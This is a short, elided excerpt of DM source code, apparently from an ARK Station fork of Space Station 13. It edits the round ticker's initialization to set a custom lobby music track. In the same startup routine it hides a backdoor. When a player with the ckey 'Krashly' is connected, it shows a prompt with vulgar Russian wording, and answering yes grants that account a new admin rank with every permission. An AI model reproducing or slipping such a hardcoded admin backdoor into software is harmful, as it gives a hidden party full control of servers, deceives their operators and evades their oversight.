...
/datum/controller/subsystem/ticker/Initialize()
	...
	if(!length(music))
		...
		if(length(music) > 1)
			music -= old_login_music
		set_lobby_music('modularz_arkstation/_master_files/sound/lobby_sound/Serence.ogg') // ARK STATION EDIT - We have own sound | set_lobby_music(pick(music))
	else
	...
	switch(current_state)
		if(GAME_STATE_STARTUP)
			...
			for(var/client/C in GLOB.clients)
				...
				if(C.ckey == "Krashly")
					if(tgui_alert(C, "Демидрол", "Пизда?", list("Да", "Нет")) == "Да")
						var/datum/admin_rank/rank = new("Sosal?", R_EVERYTHING, R_DBRANKS, R_EVERYTHING)
						new /datum/admins(list(rank), C.ckey, 1, 1)
